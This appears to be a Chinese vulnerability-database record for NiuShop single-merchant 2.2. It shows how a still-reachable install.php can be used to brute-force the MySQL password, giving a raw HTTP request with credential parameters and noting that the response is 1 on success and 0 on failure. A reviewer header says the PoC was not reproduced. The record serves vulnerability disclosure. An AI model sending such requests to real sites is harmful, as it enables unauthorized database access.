---
source: "hatch 补库批 20260928"
product: "NiuShop单商户2.2"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Niushop 单商户 2.2 爆破MySQL密码"
prerequisites: "来源所述条件，未列明部分仍待核：install.php仍可达并接受action=db流程；DB连接目标可达，无请求限制"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-47de61bd4a4b7bc00ce37f62"
entity_id: "ve-47de61bd4a4b7bc00ce37f62"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：install.php仍可达并接受action=db流程；DB连接目标可达，无请求限制

- **凭据与会话边界（1）**：0/1是凭据尝试判据，不等同已完成密码破解；安装锁/部署状态未说明。抓包中的会话不能视为未认证访问证明。需重新取得授权测试会话，不能复用文中值。

- **证据待核（2）**：dbserver可控是否构成其他网络访问能力未证明，不外推；只有一例无正负响应文本。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Niushop 单商户 2.2 爆破MySQL密码

一、漏洞简介
------------

二、漏洞影响
------------

Version：单商户 2.2

三、复现过程
------------

### 安装爆破MySQL密码

    GET /niushop/install.php?action=true&dbserver=127.0.0.1&dbpassword=root2&dbusername=root&dbname=niushop_b2c HTTP/1.1
    Host: 127.0.0.1
    Accept: */*
    X-Requested-With: XMLHttpRequest
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36
    Referer: http://127.0.0.1/niushop/install.php?refresh
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
    Cookie: action=db
    Connection: close

![](./.resource/Niushop单商户2.2爆破MySQL密码/media/rId25.jpg)

爆破成功返回1，密码错误返回0

参考链接
--------

> https://y4er.com/post/niushop-getshell/
